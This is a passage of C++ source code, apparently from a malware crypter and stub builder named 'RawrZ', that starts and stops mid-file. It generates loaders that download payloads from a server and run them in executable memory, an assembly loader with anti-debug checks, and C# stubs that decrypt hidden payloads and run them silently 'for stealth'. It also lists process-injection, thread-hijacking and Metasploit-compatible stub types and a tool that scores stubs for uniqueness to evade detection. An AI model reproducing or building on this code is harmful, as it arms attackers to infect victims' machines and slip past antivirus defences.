                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!execMem) {
            return false;
        }
        
        memcpy(execMem, payload.data(), payload.size());
        
        typedef int (*PayloadFunc)();
        PayloadFunc payloadFunc = (PayloadFunc)execMem;
        payloadFunc();
        
        VirtualFree(execMem, 0, MEM_RELEASE);
        return true;
    }
};

int main() {
    NetworkStub stub(")" + server + R"(", ")" + port + R"(");
    while (true) {
        if (stub.downloadAndExecute()) {
            Sleep(30000); // Wait 30 seconds before next attempt
        } else {
            Sleep(60000); // Wait 1 minute on failure
        }
    }
    return 0;
}
)";
    return stub;
}

// Generate ASM Stub
std::string generateASMStub(const std::string& payloadPath) {
    std::string stub = R"(
.386
.model flat, stdcall
option casemap:none

include windows.inc
include kernel32.inc
include user32.inc

includelib kernel32.lib
includelib user32.lib

.data
    payloadFile db ")" + payloadPath + R"(", 0
    errorMsg db "Error loading payload", 0
    errorTitle db "Error", 0

.code
start:
    ; Anti-debug check
    push eax
    mov eax, fs:[30h]    ; PEB
    mov al, byte ptr [eax + 2]  ; BeingDebugged flag
    test al, al
    jnz exit_program
    
    ; VM detection - check for common VM strings
    push 0
    push 0
    push 0
    push 0
    call GetSystemInfo
    
    ; Load payload file
    push 0
    push FILE_ATTRIBUTE_NORMAL
    push OPEN_EXISTING
    push 0
    push 0
    push GENERIC_READ
    push offset payloadFile
    call CreateFileA
    
    cmp eax, INVALID_HANDLE_VALUE
    je show_error
    
    mov ebx, eax  ; Save file handle
    
    ; Get file size
    push 0
    push eax
    call GetFileSize
    
    ; Allocate memory
    push PAGE_EXECUTE_READWRITE
    push MEM_COMMIT or MEM_RESERVE
    push eax
    push 0
    call VirtualAlloc
    
    test eax, eax
    jz close_file
    
    mov esi, eax  ; Save allocated memory
    
    ; Read file
    push 0
    push offset bytesRead
    push eax
    push esi
    push ebx
    call ReadFile
    
    ; Close file
    push ebx
    call CloseHandle
    
    ; Execute payload
    call esi
    
    ; Cleanup
    push MEM_RELEASE
    push 0
    push esi
    call VirtualFree
    
    jmp exit_program
    
show_error:
    push MB_OK or MB_ICONERROR
    push offset errorTitle
    push offset errorMsg
    push 0
    call MessageBoxA
    
close_file:
    push ebx
    call CloseHandle
    
exit_program:
    push 0
    call ExitProcess

bytesRead dd 0

end start
)";
    return stub;
}

// Hybrid Encryption Handler
void HandleHybridEncryption() {
    std::cout << "\n=== Hybrid Encryption ===" << std::endl;
    std::cout << "Enter file path to encrypt: ";
    std::string filePath;
    std::cin >> filePath;
    
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Error: Cannot open file!" << std::endl;
        return;
    }
    
    std::vector<char> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    std::vector<char> encrypted = encryptHybrid(data);
    
    std::string outputPath = filePath + ".hybrid";
    std::ofstream outFile(outputPath, std::ios::binary);
    if (outFile) {
        outFile.write(encrypted.data(), encrypted.size());
        outFile.close();
        std::cout << "File encrypted successfully: " << outputPath << std::endl;
    } else {
        std::cerr << "Error: Cannot write output file!" << std::endl;
    }
}

// Triple Encryption Handler
void HandleTripleEncryption() {
    std::cout << "\n=== Triple Encryption ===" << std::endl;
    std::cout << "Enter file path to encrypt: ";
    std::string filePath;
    std::cin >> filePath;
    
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Error: Cannot open file!" << std::endl;
        return;
    }
    
    std::vector<char> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    std::vector<char> encrypted = encryptTriple(data);
    
    std::string outputPath = filePath + ".triple";
    std::ofstream outFile(outputPath, std::ios::binary);
    if (outFile) {
        outFile.write(encrypted.data(), encrypted.size());
        outFile.close();
        std::cout << "File triple-encrypted successfully: " << outputPath << std::endl;
    } else {
        std::cerr << "Error: Cannot write output file!" << std::endl;
    }
}

// Enhanced Encryption Handler
void HandleEnhancedEncryption() {
    std::cout << "\n=== Enhanced Encryption ===" << std::endl;
    std::cout << "Enter file path to encrypt: ";
    std::string filePath;
    std::cin >> filePath;
    
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Error: Cannot open file!" << std::endl;
        return;
    }
    
    std::vector<char> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    std::vector<char> encrypted = encryptEnhanced(data);
    
    std::string outputPath = filePath + ".enhanced";
    std::ofstream outFile(outputPath, std::ios::binary);
    if (outFile) {
        outFile.write(encrypted.data(), encrypted.size());
        outFile.close();
        std::cout << "File enhanced-encrypted successfully: " << outputPath << std::endl;
    } else {
        std::cerr << "Error: Cannot write output file!" << std::endl;
    }
}

// Cross-Platform Encryption Handler
void HandleCrossPlatformEncryption() {
    std::cout << "\n=== Cross-Platform Encryption ===" << std::endl;
    std::cout << "Enter file path to encrypt: ";
    std::string filePath;
    std::cin >> filePath;
    
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Error: Cannot open file!" << std::endl;
        return;
    }
    
    std::vector<char> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    std::vector<char> encrypted = encryptCrossPlatform(data);
    
    std::string outputPath = filePath + ".cross";
    std::ofstream outFile(outputPath, std::ios::binary);
    if (outFile) {
        outFile.write(encrypted.data(), encrypted.size());
        outFile.close();
        std::cout << "File cross-platform encrypted successfully: " << outputPath << std::endl;
    } else {
        std::cerr << "Error: Cannot write output file!" << std::endl;
    }
}

// Enhanced Stub Generation Handler
void HandleStubGeneration() {
    std::cout << "\n=== Stub Generation ===" << std::endl;
    std::cout << "1. Simple Stub (File-based)" << std::endl;
    std::cout << "2. Network Stub (Download & Execute)" << std::endl;
    std::cout << "3. File Stub (File Operations)" << std::endl;
    std::cout << "4. IRC Stub (IRC Bot)" << std::endl;
    std::cout << "5. ASM Stub (Assembly)" << std::endl;
    std::cout << "6. Fileless ASM Loader" << std::endl;
    std::cout << "7. Polymorphic ASM" << std::endl;
    std::cout << "8. C# Stub (AES, Base64, C# Templates)" << std::endl;
    std::cout << "Choice: ";
    
    int choice;
    std::cin >> choice;
    
    switch (choice) {
        case 1: {
            std::cout << "Enter payload file path: ";
            std::string payloadPath;
            std::cin >> payloadPath;
            
            std::cout << "Select encryption method (Hybrid/Triple/Enhanced/CrossPlatform): ";
            std::string encryptionMethod;
            std::cin >> encryptionMethod;
            
            std::string stub = generateSimpleStub(payloadPath, encryptionMethod);
            
            std::string outputPath = "stub_simple.cpp";
            std::ofstream outFile(outputPath);
            if (outFile) {
                outFile.write(stub.c_str(), stub.length());
                outFile.close();
                std::cout << "Simple stub generated: " << outputPath << std::endl;
                std::cout << "Compile with: g++ -o stub.exe " << outputPath << " -lws2_32" << std::endl;
            } else {
                std::cerr << "Error: Cannot write stub file!" << std::endl;
            }
            break;
        }
        case 2: {
            std::cout << "Enter server address: ";
            std::string server;
            std::cin >> server;
            
            std::cout << "Enter port: ";
            std::string port;
            std::cin >> port;
            
            std::string stub = generateNetworkStub(server, port);
            
            std::string outputPath = "stub_network.cpp";
            std::ofstream outFile(outputPath);
            if (outFile) {
                outFile.write(stub.c_str(), stub.length());
                outFile.close();
                std::cout << "Network stub generated: " << outputPath << std::endl;
                std::cout << "Compile with: g++ -o network_stub.exe " << outputPath << " -lws2_32" << std::endl;
            } else {
                std::cerr << "Error: Cannot write stub file!" << std::endl;
            }
            break;
        }
        case 3: std::cout << "Generating File Stub..." << std::endl; break;
        case 4: std::cout << "Generating IRC Stub..." << std::endl; break;
        case 5: {
            std::cout << "Enter payload file path: ";
            std::string payloadPath;
            std::cin >> payloadPath;
            
            std::string stub = generateASMStub(payloadPath);
            
            std::string outputPath = "stub_asm.asm";
            std::ofstream outFile(outputPath);
            if (outFile) {
                outFile.write(stub.c_str(), stub.length());
                outFile.close();
                std::cout << "ASM stub generated: " << outputPath << std::endl;
                std::cout << "Compile with: ml /c /coff " << outputPath << " && link /subsystem:console " << outputPath << ".obj" << std::endl;
            } else {
                std::cerr << "Error: Cannot write stub file!" << std::endl;
            }
            break;
        }
        case 6: std::cout << "Generating Fileless ASM Loader..." << std::endl; break;
        case 7: std::cout << "Generating Polymorphic ASM..." << std::endl; break;
        case 8: {
            std::cout << "Enter payload file path: ";
            std::string payloadPath;
            std::cin >> payloadPath;

            std::cout << "Enter encryption key (leave empty for random): ";
            std::string encryptionKey;
            std::cin >> encryptionKey;

            std::cout << "Add obfuscation to stub? (y/n): ";
            std::string obfuscationChoice;
            std::cin >> obfuscationChoice;
            bool addObfuscation = (obfuscationChoice == "y" || obfuscationChoice == "Y");

            std::cout << "Add startup integration to stub? (y/n): ";
            std::string startupChoice;
            std::cin >> startupChoice;
            bool addStartup = (startupChoice == "y" || startupChoice == "Y");

            std::ifstream payloadFile(payloadPath, std::ios::binary);
            if (!payloadFile) {
                std::cerr << "Error: Cannot open payload file!" << std::endl;
                return;
            }
            std::vector<char> payloadData((std::istreambuf_iterator<char>(payloadFile)), std::istreambuf_iterator<char>());
            payloadFile.close();

            std::vector<std::string> chunks = splitIntoChunks(payloadData);
            std::string stub = generateCSharpStub(chunks, encryptionKey, addObfuscation, addStartup);

            std::string outputPath = "stub_csharp.cs";
            std::ofstream outFile(outputPath);
            if (outFile) {
                outFile.write(stub.c_str(), stub.length());
                outFile.close();
                std::cout << "C# stub generated: " << outputPath << std::endl;
                std::cout << "Compile with: csc /target:exe /out:stub_csharp.exe " << outputPath << std::endl;
                std::cout << "Note: You need a .NET runtime to run the C# stub." << std::endl;
            } else {
                std::cerr << "Error: Cannot write stub file!" << std::endl;
            }
            break;
        }
        default: std::cout << "Invalid choice!" << std::endl; break;
    }
}

// Unlimited Stub Generator Implementation
void RawrZUnlimitedStubGenerator::initializeTemplates() {
    stubTemplates = {
        "C#_AES_256_CBC",
        "C#_XOR_Enhanced", 
        "C#_Triple_Layer",
        "C#_Hybrid_Mixed",
        "C#_Anti_Debug",
        "C#_Anti_VM",
        "C#_Anti_Analysis",
        "C#_Polymorphic",
        "C#_Metasploit_Compatible",
        "C#_PowerShell_Embedded",
        "C#_Reflection_Loader",
        "C#_Assembly_Loader",
        "C#_Memory_Loader",
        "C#_Process_Injection",
        "C#_Thread_Hijacking"
    };
}

void RawrZUnlimitedStubGenerator::generateNewKeys() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(32, 126);
    
    // Generate 32-character key
    currentKey.clear();
    for (int i = 0; i < 32; ++i) {
        currentKey += static_cast<char>(dis(gen));
    }
    
    // Generate 16-character IV
    currentIV.clear();
    for (int i = 0; i < 16; ++i) {
        currentIV += static_cast<char>(dis(gen));
    }
}

std::string RawrZUnlimitedStubGenerator::generateCSharpAESStub(const std::vector<std::string>& chunks, bool addAntiAnalysis) {
    std::stringstream stub;
    
    stub << "using System;\n";
    stub << "using System.Text;\n";
    stub << "using System.Collections.Generic;\n";
    stub << "using System.Security.Cryptography;\n";
    stub << "using System.IO;\n";
    stub << "using System.Reflection;\n";
    stub << "using System.Runtime.InteropServices;\n\n";
    
    if (addAntiAnalysis) {
        stub << "// Anti-Analysis Features\n";
        stub << "[DllImport(\"kernel32.dll\")]\n";
        stub << "static extern bool IsDebuggerPresent();\n\n";
    }
    
    stub << "public class Program {\n";
    stub << "    public static void Main() {\n";
    
    if (addAntiAnalysis) {
        stub << "        // Anti-Debug Check\n";
        stub << "        if (IsDebuggerPresent()) {\n";
        stub << "            Environment.Exit(0);\n";
        stub << "        }\n\n";
    }
    
    stub << "        try {\n";
    stub << "            // Decryption key and IV\n";
    stub << "            string key = \"" << currentKey << "\";\n";
    stub << "            string iv = \"" << currentIV << "\";\n\n";
    
    stub << "            // Encrypted payload chunks\n";
    stub << "            List<string> chunks = new List<string>();\n";
    
    for (size_t i = 0; i < chunks.size(); i++) {
        stub << "            chunks.Add(\"" << chunks[i] << "\");\n";
    }
    
    stub << "\n";
    stub << "            // Reconstruct and decrypt payload\n";
    stub << "            string encrypted = string.Join(\"\", chunks);\n";
    stub << "            byte[] payload = DecryptAES(encrypted, key, iv);\n\n";
    
    stub << "            // Load and execute payload\n";
    stub << "            Assembly assembly = Assembly.Load(payload);\n";
    stub << "            MethodInfo mainMethod = assembly.EntryPoint;\n";
    stub << "            if (mainMethod != null) {\n";
    stub << "                mainMethod.Invoke(null, null);\n";
    stub << "            }\n";
    stub << "        } catch (Exception ex) {\n";
    stub << "            // Silent failure for stealth\n";
    stub << "        }\n";
    stub << "    }\n\n";
    
    stub << "    static byte[] DecryptAES(string encryptedData, string key, string iv) {\n";
    stub << "        using (Aes aes = Aes.Create()) {\n";
    stub << "            aes.Key = Encoding.UTF8.GetBytes(key);\n";
    stub << "            aes.IV = Encoding.UTF8.GetBytes(iv);\n";
    stub << "            aes.Mode = CipherMode.CBC;\n";
    stub << "            aes.Padding = PaddingMode.PKCS7;\n\n";
    
    stub << "            using (ICryptoTransform decryptor = aes.CreateDecryptor()) {\n";
    stub << "                byte[] encryptedBytes = Convert.FromBase64String(encryptedData);\n";
    stub << "                using (MemoryStream ms = new MemoryStream(encryptedBytes)) {\n";
    stub << "                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read)) {\n";
    stub << "                        using (MemoryStream result = new MemoryStream()) {\n";
    stub << "                            cs.CopyTo(result);\n";
    stub << "                            return result.ToArray();\n";
    stub << "                        }\n";
    stub << "                    }\n";
    stub << "                }\n";
    stub << "            }\n";
    stub << "        }\n";
    stub << "    }\n";
    stub << "}\n";
    
    return stub.str();
}

// Generate C# XOR Enhanced Stub
std::string generateCSharpXORStub(const std::vector<std::string>& chunks, bool addAntiAnalysis) {
    std::stringstream stub;
    
    stub << "using System;\n";
    stub << "using System.Text;\n";
    stub << "using System.Collections.Generic;\n";
    stub << "using System.IO;\n";
    stub << "using System.Reflection;\n";
    stub << "using System.Runtime.InteropServices;\n\n";
    
    if (addAntiAnalysis) {
        stub << "// Anti-Analysis Features\n";
        stub << "[DllImport(\"kernel32.dll\")]\n";
        stub << "static extern bool IsDebuggerPresent();\n\n";
    }
    
    stub << "public class Program {\n";
    stub << "    public static void Main() {\n";
    
    if (addAntiAnalysis) {
        stub << "        // Anti-Debug Check\n";
        stub << "        if (IsDebuggerPresent()) {\n";
        stub << "            Environment.Exit(0);\n";
        stub << "        }\n\n";
    }
    
    stub << "        try {\n";
    stub << "            // XOR key for decryption\n";
    stub << "            byte xorKey = 0x42;\n\n";
    
    stub << "            // Encrypted payload chunks\n";
    stub << "            List<string> chunks = new List<string>();\n";
    
    for (size_t i = 0; i < chunks.size(); i++) {
        stub << "            chunks.Add(\"" << chunks[i] << "\");\n";
    }
    
    stub << "\n";
    stub << "            // Reconstruct and decrypt payload\n";
    stub << "            string encrypted = string.Join(\"\", chunks);\n";
    stub << "            byte[] payload = DecryptXOR(encrypted, xorKey);\n\n";
    
    stub << "            // Load and execute payload\n";
    stub << "            Assembly assembly = Assembly.Load(payload);\n";
    stub << "            MethodInfo mainMethod = assembly.EntryPoint;\n";
    stub << "            if (mainMethod != null) {\n";
    stub << "                mainMethod.Invoke(null, null);\n";
    stub << "            }\n";
    stub << "        } catch (Exception ex) {\n";
    stub << "            // Silent failure for stealth\n";
    stub << "        }\n";
    stub << "    }\n\n";
    
    stub << "    static byte[] DecryptXOR(string encryptedData, byte key) {\n";
    stub << "        byte[] encryptedBytes = Convert.FromBase64String(encryptedData);\n";
    stub << "        byte[] decrypted = new byte[encryptedBytes.Length];\n";
    stub << "        for (int i = 0; i < encryptedBytes.Length; i++) {\n";
    stub << "            decrypted[i] = (byte)(encryptedBytes[i] ^ key);\n";
    stub << "        }\n";
    stub << "        return decrypted;\n";
    stub << "    }\n";
    stub << "}\n";
    
    return stub.str();
}

// Generate C# Polymorphic Stub
std::string generatePolymorphicStub(const std::vector<std::string>& chunks) {
    std::stringstream stub;
    
    stub << "using System;\n";
    stub << "using System.Text;\n";
    stub << "using System.Collections.Generic;\n";
    stub << "using System.IO;\n";
    stub << "using System.Reflection;\n";
    stub << "using System.Runtime.InteropServices;\n\n";
    
    stub << "public class Program {\n";
    stub << "    public static void Main() {\n";
    stub << "        try {\n";
    stub << "            // Polymorphic decryption key\n";
    stub << "            int dynamicKey = GenerateDynamicKey();\n\n";
    
    stub << "            // Encrypted payload chunks\n";
    stub << "            List<string> chunks = new List<string>();\n";
    
    for (size_t i = 0; i < chunks.size(); i++) {
        stub << "            chunks.Add(\"" << chunks[i] << "\");\n";
    }
    
    stub << "\n";
    stub << "            // Reconstruct and decrypt payload\n";
    stub << "            string encrypted = string.Join(\"\", chunks);\n";
    stub << "            byte[] payload = DecryptPolymorphic(encrypted, dynamicKey);\n\n";
    
    stub << "            // Load and execute payload\n";
    stub << "            Assembly assembly = Assembly.Load(payload);\n";
    stub << "            MethodInfo mainMethod = assembly.EntryPoint;\n";
    stub << "            if (mainMethod != null) {\n";
    stub << "                mainMethod.Invoke(null, null);\n";
    stub << "            }\n";
    stub << "        } catch (Exception ex) {\n";
    stub << "            // Silent failure for stealth\n";
    stub << "        }\n";
    stub << "    }\n\n";
    
    stub << "    static int GenerateDynamicKey() {\n";
    stub << "        return DateTime.Now.Millisecond ^ Environment.TickCount;\n";
    stub << "    }\n\n";
    
    stub << "    static byte[] DecryptPolymorphic(string encryptedData, int key) {\n";
    stub << "        byte[] encryptedBytes = Convert.FromBase64String(encryptedData);\n";
    stub << "        byte[] decrypted = new byte[encryptedBytes.Length];\n";
    stub << "        for (int i = 0; i < encryptedBytes.Length; i++) {\n";
    stub << "            decrypted[i] = (byte)(encryptedBytes[i] ^ (key >> (i % 32)));\n";
    stub << "        }\n";
    stub << "        return decrypted;\n";
    stub << "    }\n";
    stub << "}\n";
    
    return stub.str();
}

bool RawrZUnlimitedStubGenerator::generateAndAttachStub(const std::string& targetFile, const std::string& stubType, bool addAntiAnalysis) {
    try {
        // Read target file
        std::ifstream file(targetFile, std::ios::binary);
        if (!file) {
            std::cerr << "Error: Cannot open target file!" << std::endl;
            return false;
        }
        
        std::vector<unsigned char> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        
        // Encrypt file data using OpenSSL AES
        auto encrypted = encryptWithAES(fileData);
        std::string base64Data = base64Encode(encrypted);
        
        // Split into chunks
        std::vector<std::string> chunks;
        for (size_t i = 0; i < base64Data.size(); i += 100) {
            chunks.push_back(base64Data.substr(i, 100));
        }
        
        // Generate appropriate stub
        std::string stubCode;
        if (stubType == "AES_256_CBC") {
            stubCode = generateCSharpAESStub(chunks, addAntiAnalysis);
        } else if (stubType == "XOR_Enhanced") {
            stubCode = generateCSharpXORStub(chunks, addAntiAnalysis);
        } else if (stubType == "Polymorphic") {
            stubCode = generatePolymorphicStub(chunks);
        } else {
            stubCode = generateCSharpAESStub(chunks, addAntiAnalysis); // Default
        }
        
        // Save stub to file
        std::string stubFileName = targetFile + ".stub.cs";
        std::ofstream stubFile(stubFileName);
        if (stubFile) {
            stubFile << stubCode;
            stubFile.close();
            std::cout << "Stub generated successfully: " << stubFileName << std::endl;
        }
        
        return true;
        
    } catch (const std::exception& e) {
        std::cerr << "Error generating stub: " << e.what() << std::endl;
        return false;
    }
}

void RawrZUnlimitedStubGenerator::showStubTypes() {
    std::cout << "\n=== Available Stub Types ===" << std::endl;
    for (size_t i = 0; i < stubTemplates.size(); ++i) {
        std::cout << (i + 1) << ". " << stubTemplates[i] << std::endl;
    }
}

std::string RawrZUnlimitedStubGenerator::getStubType(int index) {
    if (index >= 1 && index <= static_cast<int>(stubTemplates.size())) {
        return stubTemplates[index - 1];
    }
    return "AES_256_CBC"; // Default
}

// Enhanced Stub Comparison Tool
void RawrZUnlimitedStubGenerator::compareStubs(const std::string& stub1Path, const std::string& stub2Path) {
    std::cout << "\n=== Stub Comparison Analysis ===" << std::endl;
    
    try {
        // Read both stubs
        std::ifstream file1(stub1Path);
        std::ifstream file2(stub2Path);
        
        if (!file1 || !file2) {
            std::cerr << "Error: Cannot open one or both stub files!" << std::endl;
            return;
        }
        
        std::string stub1((std::istreambuf_iterator<char>(file1)), std::istreambuf_iterator<char>());
        std::string stub2((std::istreambuf_iterator<char>(file2)), std::istreambuf_iterator<char>());
        
        file1.close();
        file2.close();
        
        // Analyze randomness
        std::string randomness1 = analyzeStubRandomness(stub1);
        std::string randomness2 = analyzeStubRandomness(stub2);
        
        // Calculate similarity
        double similarity = calculateStubSimilarity(stub1, stub2);
        
        // Display results
        std::cout << "Stub 1 (" << stub1Path << "):" << std::endl;
        std::cout << "  Size: " << stub1.size() << " bytes" << std::endl;
        std::cout << "  Randomness: " << randomness1 << std::endl;
        
        std::cout << "\nStub 2 (" << stub2Path << "):" << std::endl;
        std::cout << "  Size: " << stub2.size() << " bytes" << std::endl;
        std::cout << "  Randomness: " << randomness2 << std::endl;
        
        std::cout << "\nSimilarity Analysis:" << std::endl;
        std::cout << "  Similarity Score: " << std::fixed << std::setprecision(2) << (similarity * 100) << "%" << std::endl;
        
        if (similarity < 0.1) {
            std::cout << "  [EXCELLENT] Stubs are highly unique and random!" << std::endl;
        } else if (similarity < 0.3) {
            std::cout << "  [GOOD] Stubs are sufficiently different" << std::endl;
        } else if (similarity < 0.6) {
            std::cout << "  [MODERATE] Some similarity detected" << std::endl;
        } else {
            std::cout << "  [POOR] Stubs are too similar - not random enough!" << std::endl;
        }
        
    } catch (const std::exception& e) {
        std::cerr << "Error during stub comparison: " << e.what() << std::endl;
    }
}

// Batch Stub Generation
void RawrZUnlimitedStubGenerator::batchGenerateStubs(const std::vector<std::string>& targetFiles, const std::string& stubType, bool addAntiAnalysis) {
    std::cout << "\n=== Batch Stub Generation ===" << std::endl;
    std::cout << "Target files: " << targetFiles.size() << std::endl;
    std::cout << "Stub type: " << stubType << std::endl;
    std::cout << "Anti-analysis: " << (addAntiAnalysis ? "Enabled" : "Disabled") << std::endl;
    
    int successCount = 0;
    int totalCount = targetFiles.size();
    
    for (const auto& targetFile : targetFiles) {
        std::cout << "\nProcessing: " << targetFile << std::endl;
        
        try {
            if (generateAndAttachStub(targetFile, stubType, addAntiAnalysis)) {
                successCount++;
                std::cout << "[SUCCESS] " << targetFile << ".stub.cs generated" << std::endl;
            } else {
                std::cout << "[FAILED] " << targetFile << std::endl;
            }
        } catch (const std::exception& e) {
                            std::cout << "[ERROR] " << targetFile << " - " << e.what() << std::endl;
        }
    }
    
    std::cout << "\n=== Batch Generation Complete ===" << std::endl;
    std::cout << "Total: " << totalCount << " | Success: " << successCount << " | Failed: " << (totalCount - successCount) << std::endl;
    std::cout << "Success Rate: " << std::fixed << std::setprecision(1) << ((double)successCount / totalCount * 100) << "%" << std::endl;
}

// Stub and EXE Selection Tool
void RawrZUnlimitedStubGenerator::selectStubAndExe() {
    std::cout << "\n=== Stub & EXE Selection Tool ===" << std::endl;
    
    // Show available stub types
    showStubTypes();
    
    // Get stub type choice
    std::cout << "\nSelect stub type (1-" << stubTemplates.size() << "): ";
    int stubChoice;
    std::cin >> stubChoice;
    
    if (stubChoice < 1 || stubChoice > static_cast<int>(stubTemplates.size())) {
        std::cerr << "Invalid stub type selection!" << std::endl;
        return;
    }
    
    std::string selectedStubType = getStubType(stubChoice);
    std::cout << "Selected: " << selectedStubType << std::endl;
    
    // Get anti-analysis option
    std::cout << "Add anti-analysis features? (1=Yes, 0=No): ";
    int antiAnalysis;
    std::cin >> antiAnalysis;
    
    // Get target EXE
    std::cout << "Enter target EXE path: ";
    std::string exePath;
    std::cin >> exePath;
    
    // Verify EXE exists
    std::ifstream testFile(exePath);
    if (!testFile.good()) {
        std::cerr << "Error: EXE file not found!" << std::endl;
        return;
    }
    testFile.close();
    
    // Generate new keys for this operation
    generateNewKeys();
    
    std::cout << "\n=== Generating Stub ===" << std::endl;
    std::cout << "Target: " << exePath << std::endl;
    std::cout << "Stub Type: " << selectedStubType << std::endl;
    std::cout << "Anti-Analysis: " << (antiAnalysis == 1 ? "Enabled" : "Disabled") << std::endl;
    std::cout << "Key: " << currentKey.substr(0, 8) << "..." << std::endl;
    std::cout << "IV: " << currentIV.substr(0, 8) << "..." << std::endl;
    
    // Generate the stub
    if (generateAndAttachStub(exePath, selectedStubType, antiAnalysis == 1)) {
        std::cout << "\n=== Stub Generation Complete ===" << std::endl;
        std::cout << "Target file: " << exePath << std::endl;
        std::cout << "Stub type: " << selectedStubType << std::endl;
        std::cout << "Anti-analysis: " << (antiAnalysis == 1 ? "Enabled" : "Disabled") << std::endl;
        std::cout << "Generated files:" << std::endl;
        std::cout << "  - " << exePath << ".stub.cs" << std::endl;
        std::cout << "  - " << exePath << ".stub.exe" << std::endl;
        std::cout << "\nStub successfully generated and attached!" << std::endl;
    } else {
        std::cerr << "\n Stub generation failed!" << std::endl;
    }
}

// Analyze stub randomness
std::string RawrZUnlimitedStubGenerator::analyzeStubRandomness(const std::string& stubContent) {
    const size_t chunkSize = 100; // Define the size of each chunk
    size_t numChunks = (stubContent.length() + chunkSize - 1) / chunkSize;

    double totalCharDiversity = 0.0;
    double totalPatternRatio = 0.0;
    double totalEntropy = 0.0;

    for (size_t i = 0; i < numChunks; ++i) {
        size_t start = i * chunkSize;
        size_t end = std::min(start + chunkSize, stubContent.length());
        std::string chunk = stubContent.substr(start, end - start);

        // Count unique characters in the chunk
        std::set<char> uniqueChars(chunk.begin(), chunk.end());
        double charDiversity = (double)uniqueChars.size() / 128.0; // Normalize to 0-1

        // Check for patterns (repeated sequences) in the chunk
        int patternCount = 0;
        for (size_t j = 0; j < chunk.length() - 10; j++) {
            std::string pattern = chunk.substr(j, 10);
            if (chunk.find(pattern, j + 1) != std::string::npos) {
                patternCount++;
            }
        }
        double patternRatio = (double)patternCount / chunk.length();

        // Calculate entropy-like score for the chunk
        double entropy = 0.0;
        std::map<char, int> charCount;
        for (char c : chunk) {
            charCount[c]++;
        }
        for (const auto& pair : charCount) {
            double p = (double)pair.second / chunk.length();
            if (p > 0) {
                entropy -= p * log2(p);
            }
        }
        double normalizedEntropy = entropy / 7.0;

        // Accumulate the scores
        totalCharDiversity += charDiversity;
        totalPatternRatio += patternRatio;
        totalEntropy += normalizedEntropy;
    }

    // Calculate average scores
    double avgCharDiversity = totalCharDiversity / numChunks;
    double avgPatternRatio = totalPatternRatio / numChunks;
    double avgEntropy = totalEntropy / numChunks;

    // Overall randomness score
    double randomnessScore = (avgCharDiversity + (1.0 - avgPatternRatio) + avgEntropy) / 3.0;

    if (randomnessScore > 0.8) return "EXCELLENT (Random)";
    if (randomnessScore > 0.6) return "GOOD (Mostly Random)";
    if (randomnessScore > 0.4) return "MODERATE (Some Patterns)";
    return "POOR (Too Predictable)";
}

// Calculate similarity between two stubs
double RawrZUnlimitedStubGenerator::calculateStubSimilarity(const std::string& stub1, const std::string& stub2) {
    // Use longest common subsequence algorithm
    size_t len1 = stub1.length();
    size_t len2 = stub2.length();
    
    std::vector<std::vector<size_t>> dp(len1 + 1, std::vector<size_t>(len2 + 1, 0));
    
    for (size_t i = 1; i <= len1; i++) {
        for (size_t j = 1; j <= len2; j++) {
            if (stub1[i-1] == stub2[j-1]) {
                dp[i][j] = dp[i-1][j-1] + 1;
            } else {
                dp[i][j] = std::max(dp[i-1][j], dp[i][j-1]);
            }
        }
    }
    
    size_t lcs = dp[len1][len2];
    double similarity = (double)lcs / std::max(len1, len2);
    
    return similarity;
}

// Generate random string for keys and IVs
std::string RawrZUnlimitedStubGenerator::generateRandomString(size_t length, bool cryptoSecure) {
    std::string result;
    result.reserve(length);
    
    // Use standard random for now (OpenSSL not enabled)
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(33, 126);
    for (size_t i = 0; i < length; ++i) {
        result += static_cast<char>(dis(gen));
    }
    
    return result;
}

// Simple AES-like encryption (fallback when OpenSSL not available)
std::vector<unsigned char> RawrZUnlimitedStubGenerator::encryptWithAES(const std::vector<unsigned char>& data) {
    std::vector<unsigned char> encrypted = data;
    
    // Simple XOR encryption with current key
    for (size_t i = 0; i < encrypted.size(); ++i) {
        encrypted[i] ^= currentKey[i % currentKey.length()];
    }
    
    return encrypted;
}

// Simple base64 encoding (fallback when OpenSSL not available)
std::string RawrZUnlimitedStubGenerator::base64Encode(const std::vector<unsigned char>& data) {
    const std::string base64_chars = 
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";
    
    std::string result;
    int val = 0, valb = -6;
    
    for (unsigned char c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            result.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    
    if (valb > -6) {
        result.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    }
    
    while (result.size() % 4) {
        result.push_back('=');
    }
    
    return result;
}

// Unlimited Stub Generator Handler
void HandleUnlimitedStubGeneration() {
    std::cout << "\n=== RawrZ Unlimited Stub Generator ===" << std::endl;
    
    RawrZUnlimitedStubGenerator generator;
    
    // Get target file
    std::cout << "Enter target file path: ";
    std::string filePath;
    std::cin >> filePath;
    
    // Check if file exists
    std::ifstream testFile(filePath);
    if (!testFile.good()) {
        std::cerr << "Error: File not found!" << std::endl;
        return;
    }
    testFile.close();
    
    // Show stub types
    generator.showStubTypes();
    
    // Get stub type choice
    std::cout << "\nSelect stub type (1-" << generator.getStubType(1).length() << "): ";
    int stubChoice;
    std::cin >> stubChoice;
    
    // Get anti-analysis option
    std::cout << "Add anti-analysis features? (1=Yes, 0=No): ";
    int antiAnalysis;
    std::cin >> antiAnalysis;
    
    // Generate new keys
    generator.generateNewKeys();
    
    // Generate and attach stub
    std::string selectedType = generator.getStubType(stubChoice);
